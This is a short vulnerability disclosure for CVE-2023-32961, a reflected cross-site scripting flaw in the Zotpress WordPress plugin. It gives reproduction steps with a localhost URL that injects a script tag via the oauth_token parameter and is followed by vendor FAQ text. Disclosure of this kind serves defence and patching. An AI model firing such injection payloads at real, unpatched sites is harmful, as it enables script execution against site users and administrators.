# CVE-2023-32961 Analysis

  Posted  May 16, 2023    By  *[LOURCODE](https://github.com/LOURC0D3)*    *1 min* read
### Component details

---

#### Component name

Zotpress

#### Vulnerable version

≤ 7.3.3

#### Component slug

zotpress

#### Component link

<https://wordpress.org/plugins/zotpress/>

### Pre-requisite

---

Unauthenticated

### Vulenerability details

---

#### Short description

`get_request_token` function in `zotpress/lib/admin/admin.accounts.oauth.php` is vulnerable to a XSS attack.

#### How to reproduce (PoC)

1. Install the oauth php extension to trigger the vulnerability. (This is Zotpress’s optional)- Login to [zotero.org](https://zotero.org/)- Conditions must be met for the `get_request_token` function to execute. (first time only) Send a payload like this: `http://localhost:8080/wp-content/plugins/zotpress/lib/admin/admin.accounts.oauth.php?return_uri=http://localhost:8080&oauth_token=1`- Send a below payload `http://localhost:8080/wp-content/plugins/zotpress/lib/admin/admin.accounts.oauth.php?return_uri=http://localhost:8080&oauth_token="><script>alert(1)</script>`

#### Additional information

* You need a [zotero.org](https://zotero.org/) account.* You need to set the oauthState value to 1 to trigger it. If the above payload doesn’t work, you need to find a way to set oauthState to 1.
    + conditional expression :

  `| ``` 1  ```  ``` 		$_GET['oauth_token'] != $state['request_token_info']['oauth_token']  ``` | |
| --- | --- |`

* Easy to install php oauth extension:
  + One Line Command :

  `| ``` 1  ```  ``` 		sudo su; apt-get update; apt-get -y install gcc make autoconf libc-dev pkg-config libpcre3-dev; pecl install oauth; bash -c "echo extension=oauth.so > $PHP_INI_DIR/conf.d/oauth.ini"; service apache2 restart  ``` | |
| --- | --- |`

* Tested in wordpress:latest Docker image.

How can Patchstack provide the fastest protection?

Patchstack is one of the largest open-source vulnerability disclosers in the world. For example, in 2023 more than 70% of new WordPress vulnerabilities were originally published by Patchstack. This focus on research enables us to deploy vulnerability protection rules faster than anybody else.

What is virtual patching?

Patchstack vPatching auto-mitigates security vulnerabilities even when there's no official patch available. It's the fastest and most effective way to eliminate new security vulnerabilities without sacrificing performance.

Why would a hacker target my website?

Hackers automate attacks against new security vulnerabilities to take over as many websites as they can before users have time to patch and update. The attacks are opportunistic and victims are not chosen - everyone is a target.

What if my website has already been compromised?

We recommend reaching out to your hosting provider for server-side malware scanning or use a professional incident response service. Don't rely on plugin based malware scanners as they are commonly tampered with by malware.
